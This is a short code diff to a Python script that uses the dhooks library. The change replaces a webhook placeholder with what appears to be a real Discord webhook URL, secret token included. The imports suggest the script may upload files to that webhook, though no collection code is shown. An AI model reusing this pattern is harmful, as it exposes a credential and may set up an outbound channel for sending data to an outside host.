@@ -2,7 +2,7 @@ import os
 from dhooks import Webhook, File
 import time
 
-hook = Webhook("ENTER UR DISCORD WEBHOOK")
+hook = Webhook("https://discord.com/api/webhooks/1509179022737670184/X0ivY7dJ4_VFKflU6I8BWKH6cHtvysNlV1JFI9Br0CUIw8pQ_wK1t6mCHfrs5VoqrYwu")
 
 time.sleep(0.5)
 
